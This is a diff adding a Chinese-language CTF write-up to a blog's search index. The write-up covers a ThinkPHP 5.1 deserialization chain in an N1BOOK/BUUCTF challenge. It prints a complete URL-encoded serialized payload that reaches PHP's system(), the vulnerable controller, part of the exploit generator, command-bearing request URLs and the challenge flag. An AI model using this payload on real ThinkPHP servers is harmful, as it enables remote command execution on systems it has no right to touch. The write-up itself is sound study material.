@@ -1,6 +1,47 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>N1BOOK thinkphp反序列化利用链</title>
+    <url>/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这道题目的环境是有问题的，我不知道是BUUCTF上的环境问题，还是说Nu1l官方的docker环境有问题。提供的源代码与环境自身的源代码不一致，导致浪费了很多时间，并且官方给的exp和wp无法对应，对于没有做过tp利用链的人来说门槛较高，还需要自己去debug，不过确实学到了很多，下面开始WP。</p>
+<a id="more"></a>
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p><code>n1book{de70641304640057390e8fabc8b515bf}</code></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
+<li>访问环境时提示下载源代码<code>www.zip</code><br><img src="/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-5.png" alt> </li>
+<li>下载源代码后解压缩，通过阅读readme.md发现是thinkphp 5.1版本，网上搜索后，得到<a href="scripts/thinkphp_5.1_exp.php">利用链thinkphp_5.1_exp.php文件</a>，只需执行<code>php thinkphp_5.1_exp.php</code>，便可以得到payload。关于利用链的构造网上很多大神分析了，可以看[Thinkphp 5.1 反序列化利用链深入分析]，我就不分析了，重点讲下做题。(<span class="exturl" data-url="aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzEwNDAv" title="https://paper.seebug.org/1040/">https://paper.seebug.org/1040/<i class="fa fa-external-link"></i></span>)  <figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">   payload内容如下：</span><br><span class="line">   O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A13%3A%22think%5CRequest%22%3A3%3A%7Bs%3A7%3A%22%00%2A%00hook%22%3Ba%3A1%3A%7Bs%3A7%3A%22visible%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A8%3Bi%3A1%3Bs%3A6%3A%22isAjax%22%3B%7D%7Ds%3A9%3A%22%00%2A%00filter%22%3Bs%3A6%3A%22system%22%3Bs%3A9%3A%22%00%2A%00config%22%3Ba%3A1%3A%7Bs%3A8%3A%22var_ajax%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D%7D%7D</span><br><span class="line">   <span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3. 这里分析一下thinkphp的2个主要文件，然后分析一下[利用链thinkphp_5.1_exp.php文件](thinkphp_5.1_exp.php) </span></span><br><span class="line"><span class="string">   1. application\index\controller\index.php文件,只有请求被hello解析时，才能通过构造POST请求将payload赋值给str，实现反序列化利用。</span></span><br><span class="line"><span class="string">      `</span><span class="string">``</span>php</span><br><span class="line">      &lt;?php</span><br><span class="line">      namespace app\<span class="keyword">index</span>\controller;</span><br><span class="line"></span><br><span class="line">      class Index</span><br><span class="line">      &#123;</span><br><span class="line">         public function <span class="keyword">index</span>()</span><br><span class="line">         &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;a href='www.zip'&gt;download code&lt;/a&gt;"</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         public function hello()</span><br><span class="line">         &#123;</span><br><span class="line">            unserialize($_POST[<span class="string">'str'</span>]);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>route\route.php文件，压缩包源代码与实际BUUCTF服务器代码不一样。本人先在本地phpstudy搭建环境获得命令执行权限后，服务器相同url却不能获得权限，后来证实原因是路由代码不一致。<ul>
+<li>压缩包代码如下 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Route::get(<span class="string">'think'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">'hello,ThinkPHP5!'</span>;</span><br><span class="line">&#125;);</span><br><span class="line">Route::get(<span class="string">'hello/:name'</span>, <span class="string">'index/hello'</span>);</span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">];</span><br></pre></td></tr></table></figure></li>
+<li>BUUCTF服务器代码 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_file($_SERVER[<span class="string">"DOCUMENT_ROOT"</span>] . $_SERVER[<span class="string">"SCRIPT_NAME"</span>])) </span><br><span class="line">&#123; <span class="keyword">return</span> <span class="keyword">false</span>; &#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; <span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">"/index.php"</span>; &#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><a href="scripts/thinkphp_5.1_exp.php">利用链thinkphp_5.1_exp.php文件</a>前几行内容如下，其中<code>a</code>参数用来承载实际执行的命令。<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> $append = [];</span><br><span class="line">   <span class="keyword">private</span> $data = [];</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;append = [<span class="string">"a"</span>=&gt;[<span class="string">""</span>]]; </span><br><span class="line">      <span class="keyword">$this</span>-&gt;data = [<span class="string">"a"</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li>本机phpstudy环境下，根据源代码构造了两种url请求，以whoami为例子。第一个请求路由为<em>application\index\controller\index.php文件</em>-&gt;<em>Index类</em>-&gt;<em>hello()方法</em>，第二个请求利用了thinkphp的<span class="exturl" data-url="aHR0cHM6Ly9tLnBocC5jbi9waHBrai90aGlua3BocC80NDg0ODAuaHRtbA==" title="https://m.php.cn/phpkj/thinkphp/448480.html">兼容模式url<i class="fa fa-external-link"></i></span></li>
+</ol>
+<ul>
+<li><code>http://{your_server}/public/index.php/index/Index/hello?a=whoami</code></li>
+<li><code>http://{your_server}/public/index.php?s=index/index/hello&amp;a=whoami</code><br><img src="/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-1.png" alt><br><img src="/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-2.png" alt></li>
+</ul>
+<ol start="5">
+<li>介绍完本机命令执行，再来介绍BUUCTF命令执行。服务器只能用第二种请求，构造参数<code>a=cd /;ls</code>和<code>a=cd /;cat FLAG</code>，<code>str</code>的值为1中payload，通过<code>hackbar</code>或<code>burpsuite</code>发包。<br><img src="/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-3.png" alt><br><img src="/blog/N1BOOK-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/phpunser-4.png" alt> <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>thinkphp 5.1的反序列化漏洞，由于thinkphp 5.1还存在RCE漏洞(漏洞触发条件是默认路由情况下，可以导致RCE)，所以这道题源代码的route.php修改了默认路由，不能直接通过RCE执行命令，只能按着出题人思路用php反序列化。<br>难点如下</li>
+</ol>
+<ul>
+<li>找到利用点，application\index\controller\index.php文件的hello函数</li>
+<li>构造正确的路由，不清楚tp路由的话，很难构造正确的路由，正确构造<code>a</code>的值，post上传<code>str</code>的payload</li>
+<li>thinkphp5.1 php反序列化利用链</li>
+</ul>
+]]></content>
+      <categories>
+        <category>N1BOOK CTF</category>
+      </categories>
+      <tags>
+        <tag>thinkphp 5.1</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUUCTF 命令执行</title>
     <url>/blog/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
     <content><![CDATA[<h1 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h1><p>详细的写了N1BOOK中命令执行题目的题解，nc、curl、server基本用法<br><br><span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI1slRTclQUMlQUMlRTQlQkElOEMlRTclQUIlQTAlMjB3ZWIlRTglQkYlOUIlRTklOTglQjZdJUU2JUFEJUJCJUU0JUJBJUExcGluZyVFNSU5MSVCRCVFNCVCQiVBNA==" title="https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%8C%E7%AB%A0%20web%E8%BF%9B%E9%98%B6]%E6%AD%BB%E4%BA%A1ping%E5%91%BD%E4%BB%A4">题目地址<i class="fa fa-external-link"></i></span></p>
